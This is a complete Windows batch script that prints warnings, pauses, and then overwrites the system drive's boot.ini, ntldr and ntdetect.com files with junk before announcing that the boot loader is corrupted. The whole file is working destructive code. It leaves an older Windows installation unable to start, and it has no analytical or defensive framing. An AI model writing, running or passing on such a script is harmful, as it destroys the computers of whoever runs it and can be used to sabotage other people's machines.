@echo off
echo Corrupting boot loader...
echo This action may cause irreversible damage to your system.
echo Proceed with caution!

pause

echo Corrupting boot loader...
echo Please wait...

echo 0x00000000 > %systemdrive%\boot.ini
echo 0x00000000 > %systemdrive%\ntldr
echo 0x00000000 > %systemdrive%\ntdetect.com

echo Boot loader corrupted successfully!

pause
